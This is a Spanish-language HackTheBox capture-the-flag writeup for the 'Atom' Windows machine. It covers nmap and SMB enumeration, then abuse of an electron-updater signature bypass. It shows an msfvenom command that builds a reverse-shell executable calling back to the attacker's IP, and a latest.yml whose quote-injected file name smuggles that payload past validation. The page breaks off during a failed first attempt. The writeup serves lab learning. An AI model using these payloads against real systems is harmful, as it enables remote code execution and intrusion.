@@ -1,0 +1,1609 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+<link rel="icon" href="/assets/images/lanz2.png">
+
+<title>HackTheBox - Atom</title>
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HackTheBox - Atom | Sh0x blog</title>
+<meta name="generator" content="Jekyll v3.8.6" />
+<meta property="og:title" content="HackTheBox - Atom" />
+<meta name="author" content="lanz" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Máquina Windows nivel medio. Jugaremos con SMB, recrearemos actualizaciones (feature de electron) en binarios para que sean ejecutados por un equipo de QA y encontraremos la relación amorosa entre Redis y Kanban que nos permitirá desencriptar contraseñas del propio Redis." />
+<meta property="og:description" content="Máquina Windows nivel medio. Jugaremos con SMB, recrearemos actualizaciones (feature de electron) en binarios para que sean ejecutados por un equipo de QA y encontraremos la relación amorosa entre Redis y Kanban que nos permitirá desencriptar contraseñas del propio Redis." />
+<link rel="canonical" href="http://localhost:4000/htb/atom" />
+<meta property="og:url" content="http://localhost:4000/htb/atom" />
+<meta property="og:site_name" content="Sh0x blog" />
+<meta property="og:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/atom/340banner.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-07-10T00:00:00-07:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/atom/340banner.png" />
+<meta property="twitter:title" content="HackTheBox - Atom" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"lanz"},"dateModified":"2021-07-10T00:00:00-07:00","datePublished":"2021-07-10T00:00:00-07:00","description":"Máquina Windows nivel medio. Jugaremos con SMB, recrearemos actualizaciones (feature de electron) en binarios para que sean ejecutados por un equipo de QA y encontraremos la relación amorosa entre Redis y Kanban que nos permitirá desencriptar contraseñas del propio Redis.","headline":"HackTheBox - Atom","image":"https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/atom/340banner.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/htb/atom"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/images/sh0x.png"},"name":"lanz"},"url":"http://localhost:4000/htb/atom"}</script>
+<!-- End Jekyll SEO tag -->
+
+    
+<link href="/assets/css/prism.css" rel="stylesheet">
+
+<link href="/assets/css/theme.css" rel="stylesheet">
+
+<script src="/assets/js/jquery.min.js"></script>
+
+</head>
+
+
+
+
+<body>
+	<!-- defer loading of font and font awesome -->
+	<noscript id="deferred-styles">
+		<link href="https://fonts.googleapis.com/css?family=Sen:400,700&display=swap" rel="stylesheet">
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
+	</noscript>
+
+
+<!-- Begin Sidebar Navigation
+================================================== -->
+
+<div class="sidebar">    
+</div>   
+<div class="nav-icon">
+    <div class="hamburger-bar"></div>
+</div>
+<div id="blackover-nav" class="blackover"></div>
+<nav id="menu">
+    <ul>
+        <h3>El tiempo a destiempo</h3>
+        <li><a href="/" style="color: #0ecbe4;">Home</a></li>
+        <li><a href="/categories#article">Artículos</a></li>
+        <li><a href="/categories#htb">HackTheBox</a></li>
+        <li><a href="/about" style="color: rgb(89, 89, 89);">Whoami</a></li>
+    </ul>   
+</nav>
+
+<script src="/assets/js/lunr.js"></script>
+
+<style>
+    
+</style>
+
+<div class="wrap-search">
+    <div class="d-flex align-items-center ml-auto">
+        <i class="fas fa-search show-search"></i>
+        <form class="bd-search ml-3" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
+            <input type="text" class="form-control bigradius text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Escribe y enter :P"/>
+        </form>
+    </div>
+</div>
+
+<div id="lunrsearchresults">
+    <ul></ul>
+</div>
+
+<script src="/assets/js/lunrsearchengine.js"></script>
+
+
+<!-- End Sidebar Navigation
+================================================== -->
+
+<div class="site-content ">
+
+<div class="container">
+
+    <!-- Site Logo/Name
+    ================================================== -->
+   
+    <a class="navbar-brand" href="/">
+        <img src="/assets/images/sh0x.png" alt="Sh0x blog">
+    </a>  
+   
+
+    <!-- Site Tag
+    ================================================== -->
+    
+
+    <!-- Content
+    ================================================== -->
+    <div class="main-content">
+        <div class="entry-header">
+    <!-- Post Title -->
+    <h1 class="posttitle">HackTheBox - Atom</h1>
+    <!-- Author & Date  Box -->
+    
+    
+    <div class="d-flex align-items-center mt-4">
+        <div>
+            
+            <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+            
+        </div>            
+        <div>
+        Funk <a targ="_blank" class="text-info">Sh0x</a> el 
+        <span class="post-date"><time class="post-date" datetime="2021-07-10">10 Jul 2021</time></span>           
+        
+        </div>            
+    </div>
+    
+</div>
+
+<!-- Adsense under title if enabled from _config.yml (change your pub id and slot) -->
+
+
+<!-- Featured Image -->
+
+<div class="entry-featured-image">
+    
+    <img class="featured-image " src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/atom/340banner.png" alt="HackTheBox - Atom">
+    
+</div>
+
+
+<!-- Content -->
+<!-- Post, Page Content
+================================================== -->
+<div class="article-post">
+    <!-- Toc if any -->
+    
+    <!-- End Toc -->
+    <p>Máquina <strong>Windows</strong> nivel medio. Jugaremos con <strong>SMB</strong>, recrearemos actualizaciones (feature de <strong>electron</strong>) en binarios para que sean ejecutados por un equipo de <strong>QA</strong> y encontraremos la relación amorosa entre <strong>Redis</strong> y <strong>Kanban</strong> que nos permitirá desencriptar contraseñas del propio <strong>Redis</strong>.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/atom/340atomHTB.png" alt="340atomHTB" /></p>
+
+<h3 id="tldr-spanish-writeup">TL;DR (Spanish writeup)</h3>
+
+<p><strong>Creada por</strong>: <a href="https://www.hackthebox.eu/profile/13531">MrR3boot</a>.</p>
+
+<p>A quemarnossssssss</p>
+
+<p><strong>Atom</strong> es una máquina que nos ofrece un servicio web con un comprimido a ser descargado (poco hicimos con él (o bueno, poco mostré :P)) con un binario <code>.exe</code>, también tendremos una carpeta compartida con <strong>SAMBA</strong>, de ella obtendremos un archivo <code>.pdf</code>. Nos damos cuenta de que es un manual de usuario indicándonos algunos pasos interesantes…</p>
+
+<p>Principalmente en la carpeta compartida hay 3 carpetas dentro, ellas están relacionadas con un equipo de <strong>QA</strong> que va a estar verificando esas 3 carpetas en busca de cositas y si X cosa pasa lo ejecutara, esas cositas se llaman actualizaciones. Pero las actualizaciones tienen que estar relacionadas con <a href="https://www.electron.build/"><strong>electron-builder</strong></a>) (pista del <strong>PDF</strong>), investigando encontraremos una vulnerabilidad contra <strong>electron-builder</strong> que nos permite ejecutar comandos remotamente a través de un fallo en un <strong>feature</strong> (que se enfoca en encontrar actualizaciones en binarios), acá entran en juego las 3 carpetas.</p>
+
+<p>Nosotros tendremos que recrear una actualización de un binario (malicioso), esto a través del archivo <code>latest.yml</code> (que el <strong>feature</strong> (equipo de <strong>QA</strong>) va a estar buscando constantemente en las carpetas de actualizaciones), con esto lograremos que la máquina (feature/QA) ejecute el binario y en nuestro caso nos devuelva una <strong>Reverse Shell</strong> como el usuario <strong>jason</strong>. (Un poco (bastante) difícil explicar esa parte en poquitas líneas).</p>
+
+<blockquote>
+  <p><a href="https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/atom/electroPWn.py"><strong>electroPWn.py</strong>, script que automatiza este proceso y nos devuelve una Shell</a>.</p>
+</blockquote>
+
+<p>Estando dentro de la máquina enumeraremos el servicio <strong>Redis</strong>, encontraremos unas credenciales en un archivo de configuración que nos servirán para jugar dentro del servidor.</p>
+
+<p>Enumerando la base de datos tendremos otras credenciales en este caso del usuario <strong>Administrator</strong>, pero la contraseña estará encriptada… Estando perdidos sin saber como desencriptarla enumeraremos de nuevo y veremos que <strong>kanban</strong> y <strong>redis</strong> están relacionados, <strong>kanban</strong> le da la interfaz y redis el backend para guardar información, por lo que la data encontrada (las credenciales) llegaron desde <strong>kanban</strong> a <strong>redis</strong>…</p>
+
+<p>Usaremos un exploit encargado de desencriptar contraseñas generadas desde <strong>kanban</strong>, con esto obtendremos en texto plano la contraseña del usuario <strong>Administrator</strong>.</p>
+
+<p>Haciendo reutilización de contraseñas (y usando <strong>evil-winrm</strong>) conseguiremos una <strong>Shell</strong> en el sistema como <strong>Administrator</strong>.</p>
+
+<p>…</p>
+
+<h4 id="clasificación-de-la-máquina">Clasificación de la máquina</h4>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/atom/340statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 90%;" /></p>
+
+<blockquote>
+  <p>Escribo para tener mis “notas”, por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) además de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva más de enseñanza que de solo plasmar lo que hice.</p>
+</blockquote>
+
+<p>…</p>
+
+<p>Camino de verdades y rarezas:</p>
+
+<ol>
+  <li><a href="#enumeracion">Enumeración</a>.
+    <ul>
+      <li><a href="#enum-nmap">Enumeración de puertos con <strong>nmap</strong></a>.</li>
+    </ul>
+  </li>
+  <li><a href="#explotacion">Explotación</a>.
+    <ul>
+      <li><a href="#expl-f-yml-bin-hash">(EL FAIL) Generando <strong>latest.yml</strong>, binario malicioso y hash sha512</a>.</li>
+      <li><a href="#expl-yml-bin-hash">(EL BUENARDO) Generando <strong>latest.yml</strong>, binario malicioso y hash sha512</a>.</li>
+      <li><a href="#expl-revsh-jason">Obtención <strong>Reverse Shell</strong> usuario <strong>jason</strong></a>.</li>
+    </ul>
+  </li>
+  <li><a href="#escalada-de-privilegios">Escalada de privilegios</a>.
+    <ul>
+      <li><a href="#privesc-redis">Acceso servidor <strong>redis</strong> credenciales encontradas en archivo <strong>.conf</strong></a>.</li>
+      <li><a href="#privesc-dump-redis">Dumpeo base de datos <strong>redis</strong></a>.</li>
+      <li><a href="#privesc-encrypted-revealed">Desencriptamos la contraseña del usuario <strong>Administrator</strong></a>.</li>
+    </ul>
+  </li>
+</ol>
+
+<p>…</p>
+
+<h2 id="enumeracion">Enumeración <a href="#enumeracion">#</a></h2>
+
+<hr />
+
+<h3 id="enum-nmap">Enumeración de puertos con <em>nmap</em> <a href="#enum-nmap">⌖</a></h3>
+
+<p>Empezaremos jugando con <strong>nmap</strong> para ver que servicios esta corriendo la máquina:</p>
+
+<pre><code class="language-bash">❱ nmap -p- --open -v 10.10.10.237 -oG initScan
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p-</td>
+      <td style="text-align: left">Escanea todos los 65535</td>
+    </tr>
+    <tr>
+      <td>–open</td>
+      <td style="text-align: left">Solo los puertos que están abiertos</td>
+    </tr>
+    <tr>
+      <td>-v</td>
+      <td style="text-align: left">Permite ver en consola lo que va encontrando</td>
+    </tr>
+    <tr>
+      <td>-oG</td>
+      <td style="text-align: left">Guarda el output en un archivo con formato grepeable para usar una <a href="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png">función <strong>extractPorts</strong></a> de <a href="https://s4vitar.github.io/">S4vitar</a> que me extrae los puertos en la clipboard</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Obtenemos:</p>
+
+<pre><code class="language-bash">❱ cat initScan
+# Nmap 7.80 scan initiated Wed Jun 23 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10.10.10.237
+# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
+Host: 10.10.10.237 ()   Status: Up
+Host: 10.10.10.237 ()   Ports: 80/open/tcp//http///, 135/open/tcp//msrpc///, 443/open/tcp//https///, 445/open/tcp//microsoft-ds///, 5985/open/tcp//wsman///, 6379/open/tcp//redis///  Ignored State: filtered (65529)
+# Nmap done at Wed Jun 23 25:25:25 2021 -- 1 IP address (1 host up) scanned in 202.56 seconds
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Puerto</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>80</td>
+      <td style="text-align: left"><strong><a href="https://searchnetworking.techtarget.com/definition/port-80">HTTP</a></strong>: Nos provee de un servidor web.</td>
+    </tr>
+    <tr>
+      <td>135</td>
+      <td style="text-align: left"><strong><a href="https://book.hacktricks.xyz/pentesting/135-pentesting-msrpc">RPC</a></strong>: Permite la comunicación entre programas.</td>
+    </tr>
+    <tr>
+      <td>443</td>
+      <td style="text-align: left"><strong><a href="https://es.wikipedia.org/wiki/Protocolo_seguro_de_transferencia_de_hipertexto">HTTPS</a></strong>: Es un servidor web con un certificado “seguro”.</td>
+    </tr>
+    <tr>
+      <td>445</td>
+      <td style="text-align: left"><strong><a href="https://www.varonis.com/blog/smb-port/">SMB</a></strong>: Nos ayuda a la transferencia de archivos en una red.</td>
+    </tr>
+    <tr>
+      <td>5985</td>
+      <td style="text-align: left"><strong><a href="https://geeks.ms/eliasmereb/2011/04/14/introduccin-a-winrm-para-windows-server-2008-r2/">WinRM</a></strong>: Nos permite realizar tareas administrativas remotamente (entre muuuchas cosas +).</td>
+    </tr>
+    <tr>
+      <td>6379</td>
+      <td style="text-align: left"><strong><a href="https://blog.bi-geek.com/redis-para-principiantes/">Redis</a></strong>: Motor BD para almacenar datos en memoria.</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Ahora que tenemos los puertos activos, hagamos un escaneo más profundo, tratando asi de identificar que versiones y scripts están relacionados con cada servicio:</p>
+
+<p><strong>~(Usando la función <code>extractPorts</code> (referenciada antes) podemos copiar rápidamente los puertos en la clipboard, así no tenemos que ir uno a uno</strong></p>
+
+<pre><code class="language-bash">❱ extractPorts initScan 
+[*] Extracting information...
+
+    [*] IP Address: 10.10.10.237
+    [*] Open ports: 80,135,443,445,5985,6379
+
+[*] Ports copied to clipboard
+</code></pre>
+
+<p><strong>)~</strong></p>
+
+<pre><code class="language-bash">❱ nmap -p 80,135,443,445,5985,6379 -sC -sV 10.10.10.237 -oN portScan
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p</td>
+      <td style="text-align: left">Escaneo de los puertos obtenidos</td>
+    </tr>
+    <tr>
+      <td>-sC</td>
+      <td style="text-align: left">Muestra todos los scripts relacionados con el servicio</td>
+    </tr>
+    <tr>
+      <td>-sV</td>
+      <td style="text-align: left">Nos permite ver la versión del servicio</td>
+    </tr>
+    <tr>
+      <td>-oN</td>
+      <td style="text-align: left">Guarda el output en un archivo</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Y ahora el escaneo nos responde con:</p>
+
+<pre><code class="language-bash">❱ cat portScan
+# Nmap 7.80 scan initiated Wed Jun 23 25:25:25 2021 as: nmap -p 80,135,443,445,5985,6379 -sC -sV -oN portScan 10.10.10.237
+Nmap scan report for 10.10.10.237
+Host is up (0.11s latency).
+
+PORT     STATE SERVICE      VERSION
+80/tcp   open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
+|_http-title: Heed Solutions
+135/tcp  open  msrpc        Microsoft Windows RPC
+443/tcp  open  ssl/http     Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
+|_http-title: Heed Solutions
+| ssl-cert: Subject: commonName=localhost
+| Not valid before: 2009-11-10T23:48:47
+|_Not valid after:  2019-11-08T23:48:47
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn: 
+|_  http/1.1
+445/tcp  open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
+5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+6379/tcp open  redis        Redis key-value store
+Service Info: Host: ATOM; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 2h23m50s, deviation: 4h02m32s, median: 3m48s
+| smb-os-discovery: 
+|   OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)
+|   OS CPE: cpe:/o:microsoft:windows_10::-
+|   Computer name: ATOM
+|   NetBIOS computer name: ATOM\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2021-06-23T10:26:40-07:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2021-06-23T17:26:36
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Wed Jun 23 25:25:25 2021 -- 1 IP address (1 host up) scanned in 69.09 seconds
+</code></pre>
+
+<p>Encontramos algunas cositas relevantes:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Puerto</th>
+      <th style="text-align: left">Servicio</th>
+      <th style="text-align: left">Versión</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">80</td>
+      <td style="text-align: left">HTTP</td>
+      <td style="text-align: left">Apache httpd 2.4.46 OpenSSL/1.1.1j PHP/7.3.27</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">443</td>
+      <td style="text-align: left">HTTPS</td>
+      <td style="text-align: left">Apache httpd 2.4.46 OpenSSL/1.1.1j PHP/7.3.27</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">445</td>
+      <td style="text-align: left">SMB</td>
+      <td style="text-align: left">Windows 10 Pro 19042 (Windows 10 Pro 6.3)</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Pero no encontramos nada más, así que empecemos a explorar cada puerto y veamos cuál será nuestra entrada (:</p>
+
+<p>…</p>
+
+<h3 id="puerto-80">Puerto 80 <a href="#puerto-80">⌖</a></h3>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/atom/340page80.png" alt="340page80" /></p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/atom/340page80_2.png" alt="340page80_2" /></p>
+
+<p>Encontramos una descripción que nos habla sobre una aplicación para tomar notas… Vemos un email:</p>
+
+<ul>
+  <li><code>MrR3boot@atom.htb</code>, del cual podemos extraer:
+    <ul>
+      <li>el usuario (<code>MrR3boot</code>)</li>
+      <li>y el dominio (<code>atom.htb</code>).</li>
+    </ul>
+  </li>
+</ul>
+
+<p>Y que si colocamos el mouse sobre el botón <code>Download for Windows</code>, nos redireccionara a <code>/releases/heed_setup_v1.0.0.zip</code>, o sea nos descargara un comprimido <code>.zip</code>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/atom/340page80_downloadforwin_hovering.png" alt="340page80_downloadforwin_hovering" /></p>
+
+<p>Pues démosle clic :P</p>
+
+<p>Obtenemos:</p>
+
+<pre><code class="language-bash">❱ file heed_setup_v1.0.0.zip 
+heed_setup_v1.0.0.zip: Zip archive data, at least v2.0 to extract
+</code></pre>
+
+<p>Y al hacer la extracción encontramos un binario <code>.exe</code> al parecer de instalación:</p>
+
+<pre><code class="language-bash">❱ unzip heed_setup_v1.0.0.zip 
+Archive:  heed_setup_v1.0.0.zip
+  inflating: heedv1 Setup 1.0.0.exe
+</code></pre>
+
+<p>Jmmm, en mi máquina no puedo probarlo, ya que tengo un problema con <strong>wine</strong>, por lo tanto debería jugar con el binario pero en una máquina virtual <strong>Windows</strong> :/</p>
+
+<p>Pero antes de intentar cualquier cosa veamos si encontramos alguna cadena de texto en el binario:</p>
+
+<pre><code class="language-bash">❱ strings heedv1\ Setup\ 1.0.0.exe
+</code></pre>
+
+<p>Al final del resultado vemos que se repite 3 veces esto:</p>
+
+<pre><code class="language-bash">...
+Athens1
+London1
+HackTheBox1
+HackTheBox1
+HackTheBox1
+admin@htb.local0
+...
+</code></pre>
+
+<p>Lo más probable es que no sea nada pero pues por si algo e.e</p>
+
+<p>Exploremos el servicio <strong>SMB</strong> antes de movernos de VM.</p>
+
+<p>…</p>
+
+<h3 id="puerto-445">Puerto 445 <a href="#puerto-445">⌖</a></h3>
+
+<p>Con el protocolo <strong>SAMBA</strong> podemos compartir recursos a traves de la red (entre muchas cositas más), existen herramietnas que nos ayudan a validar la existencia de recursos compartidos, una de ellas es <a href="https://www.hackplayers.com/2015/05/smbmap-busca-carpetas-windows-desde-kali.html">smbmap</a>, usemosla y veamos si encontramos algo:</p>
+
+<p><strong>Jugamos con credenciales “nulas” ya que no tenemos reales.</strong></p>
+
+<pre><code class="language-bash">❱ smbmap -H 10.10.10.237 -u 'null' -p 'null'
+[+] Guest session       IP: 10.10.10.237:445    Name: unknown                                           
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        ADMIN$                                                  NO ACCESS       Remote Admin
+        C$                                                      NO ACCESS       Default share
+        IPC$                                                    READ ONLY       Remote IPC
+        Software_Updates                                        READ, WRITE
+</code></pre>
+
+<p>Bien, vemos 4 recursos pero solo 1 interesante: <strong>Software_Updates</strong>, a el tenemos acceso de lectura yyy escritura, profundicemos en él con ayuda de <a href="https://jcsis.wordpress.com/2011/08/26/acceder-a-recurso-compartido-desde-un-terminal-linux-con-smbclient/">smbclient</a>:</p>
+
+<pre><code class="language-bash">❱ smbclient //10.10.10.237/Software_Updates -U 'null'
+Enter WORKGROUP\null's password: 
+Try "help" to get a list of possible commands.
+smb: \&gt; dir
+  .                                   D        0  Wed Jun 23 13:04:00 2021
+  ..                                  D        0  Wed Jun 23 13:04:00 2021
+  client1                             D        0  Wed Jun 23 13:04:00 2021
+  client2                             D        0  Wed Jun 23 13:04:00 2021
+  client3                             D        0  Wed Jun 23 13:04:00 2021
+  UAT_Testing_Procedures.pdf          A    35202  Fri Apr  9 06:18:08 2021
+
+                4413951 blocks of size 4096. 1367275 blocks available
+smb: \&gt; 
+</code></pre>
+
+<p>Opa, más directorios, pero dentro de ellos no encontramos nada, así que solo nos queda el archivo <code>.pdf</code>, descarguémoslo a nuestra máquina y veamos que contiene:</p>
+
+<pre><code class="language-bash">smb: \&gt; prompt off
+smb: \&gt; mget UAT_Testing_Procedures.pdf
+getting file \UAT_Testing_Procedures.pdf of size 35202 as UAT_Testing_Procedures.pdf (61,2 KiloBytes/sec) (average 61,2 KiloBytes/sec)
+</code></pre>
+
+<pre><code class="language-bash">❱ file UAT_Testing_Procedures.pdf 
+UAT_Testing_Procedures.pdf: PDF document, version 1.3
+</code></pre>
+
+<p>…</p>
+
+<h2 id="explotacion">Explotación <a href="#explotacion">#</a></h2>
+
+<p>Bien, usemos <a href="https://linux.die.net/man/1/xdg-open">xdg-open</a> para ver el <strong>PDF</strong>:</p>
+
+<pre><code class="language-bash">❱ xdg-open UAT_Testing_Procedures.pdf
+</code></pre>
+
+<p>Yyyyy:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/atom/340bash_pdf_UAT1.png" alt="340bash_pdf_UAT1" /></p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/atom/340bash_pdf_UAT2.png" alt="340bash_pdf_UAT2" /></p>
+
+<p>Destacamos varias cosas muyyy interesantes de cara a la explotación:</p>
+
+<ul>
+  <li>Fue creado con <strong>electron-builder</strong> (puede ser relevante, no lo sabemos).</li>
+  <li><code>Update server running</code> hace referencia a la carpeta compartida <code>Software_Updates</code> entiendo yo.</li>
+  <li>“client folders”, ya los vimos (y vimos que tenemos permisos de escritura sobre ellos).</li>
+  <li>El equipo de pruebas (<strong>QA</strong>) tomara el contenido de esas carpetas “<code>client</code>” y verificara si existen cambios, si los hay los instalará como si fuera una “actualización”.
+    <ul>
+      <li><strong>Por lo tanto podemos pensar que debemos modificar el binario <code>.exe</code> agregando contenido malicioso, subirlo a alguna carpeta <code>client</code> y el sistema lo ejecutará, por lo tanto ejecutaría el contenido malicioso, ¿no?</strong> A DARLE!!</li>
+    </ul>
+  </li>
+</ul>
+
+<p>Buscando en internet cositas sobre <strong>electron builder exploit</strong> llegamos a varios recursos:</p>
+
+<ul>
+  <li><a href="https://sghosh2402.medium.com/cve-2020-16608-8cdad9f4d9b4">RCE using XSS in Electron applications</a>.</li>
+  <li><a href="https://benjamin-altpeter.de/shell-openexternal-dangers/">The dangers of Electron’s <strong>shell.openExternal()</strong></a>.</li>
+</ul>
+
+<p>Pero el master de los masters es este, con él seguiremos el resto del writeup:</p>
+
+<ul>
+  <li><a href="https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html">Signature Validation Bypass Leading to RCE In Electron-Updater</a>.</li>
+</ul>
+
+<p>En él se habla de un feature llamado <code>electron-updater</code>, el cual se encarga de <strong>auto</strong> actualizar software (lo que estábamos hablando antes, pero automatizado), esto lo hace comparando los valores de <code>publisherName</code> (del binario que ya esta instalado) y el certificado <code>Common Name</code> (del binario a ser instalado)… (<strong>Esto toma sentido mirando el código fuente, ya que vemos las comparativas:</strong>)</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/atom/340google_signature_code_comparation.png" alt="340google_signature_code_comparation" /></p>
+
+<blockquote>
+  <p><strong>Tomada del propio artículo</strong>.</p>
+</blockquote>
+
+<p>Nos indica que en cada actualización, el servidor o aplicación va a estar buscando un archivo llamado <code>latest.yml</code>, en él estaría el nombre, ruta y hash relacionado con el programa, básicamente la definición de lo que queramos actualizar…</p>
+
+<p>En el código vemos al inicio una ejecucion llamativa, que llevada a la acción tomaría estos valores (por ejemplo):</p>
+
+<blockquote>
+  <pre><code class="language-powershell">powershell.exe -NoProfile -NonInteractive -InputFormat None -Command "Get-AuthenticodeSignature 'C:\Users\carlitos\AppData\Roaming\vulnerable_app\__update__\new_update.exe' | ConvertTo-Json -Compress"
+</code></pre>
+</blockquote>
+
+<p>Donde <code>C:\Users....exe</code> es un valor tomado de la variable <code>tempUpdateFile</code>, acá es donde entramos nosotros como atacantes (:</p>
+
+<p>Como la variable <code>tempUpdateFile</code> no tiene ningún filtro o cuenta con algún escape, podemos forzar un bypass a la validación de <code>publisherName</code> y <code>Common Name</code> mediante un error en la ejecucion del script.</p>
+
+<p>Esto de una manera muy sencilla, solo debemos crear un binario con una <code>'</code> en el nombre y esto hará que el programa falle, peeeero para que sea ejecutado necesitamos generar un hash que se relacione con el programa creado, así logramos que el actualizador tome nuestro programa como legítimo.</p>
+
+<p>Pues démosle, generemos el archivo <code>latest.yml</code>, el binario malicioso yyyy el hash de ese binario:</p>
+
+<p>…</p>
+
+<h3 id="expl-f-yml-bin-hash">(FAIL) <u>latest.yml</u>, bin malicioso y hash <a href="#expl-f-yml-bin-hash">⌖</a></h3>
+
+<p>Siguiendo el artículo y sus pocs tendríamos:</p>
+
+<p><strong>try'now.exe (binario malicioso):</strong></p>
+
+<p>Generaremos un binario que a la hora de ejecutarse nos lance una reverse Shell, ayudémonos de <a href="https://www.offensive-security.com/metasploit-unleashed/msfvenom/">msfvenom</a> para esto:</p>
+
+<pre><code class="language-bash">❱ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.103 LPORT=4433 -f exe -o try\'now.exe
+</code></pre>
+
+<pre><code class="language-bash">❱ file "try'now.exe"
+try'now.exe: PE32 executable (GUI) Intel 80386, for MS Windows
+</code></pre>
+
+<p>Ahora generamos el hash identificador (el propio blog nos provee de esta línea):</p>
+
+<p><strong>sha512 hash:</strong></p>
+
+<pre><code class="language-bash">❱ shasum -a 512 try\'now.exe | cut -d " " -f 1 | xxd -r -p | base64 | tr -d '\n'
+0Wxg/xq3XPmrHevFPBwR4aSmnc8b+5gaKB9HuEAZcBXghS2MaDblK3lRPOpCEMiqe5wFI2ZxMQ7Jc7M2JSTF8Q==
+</code></pre>
+
+<p>Y por último el archivo que estará buscando el servidor.</p>
+
+<p><strong>latest.yml:</strong></p>
+
+<p><em>(Una de las tantas pruebas)</em></p>
+
+<pre><code class="language-yml">version: 1.2.3
+files:
+  - url: try';try\'now.exe;'now.exe
+  sha512: 0Wxg/xq3XPmrHevFPBwR4aSmnc8b+5gaKB9HuEAZcBXghS2MaDblK3lRPOpCEMiqe5wFI2ZxMQ7Jc7M2JSTF8Q==
+  size: 73802
+path: try';try\'now.exe;'now.exe
+sha512: 0Wxg/xq3XPmrHevFPBwR4aSmnc8b+5gaKB9HuEAZcBXghS2MaDblK3lRPOpCEMiqe5wFI2ZxMQ7Jc7M2JSTF8Q==
+releaseDate: '2019-11-20T11:17:02.627Z'
+</code></pre>
+
+<p>Y con esto ya tendriamos los 3 pasos, el caso es que el script leeria el archivo <code>latest.yml</code>, daria error en <code>try'</code> y en teoria deberia ejecutar <code>try\'now.exe</code>, o sea, nuestro payload con la Reverse Shell…</p>
+
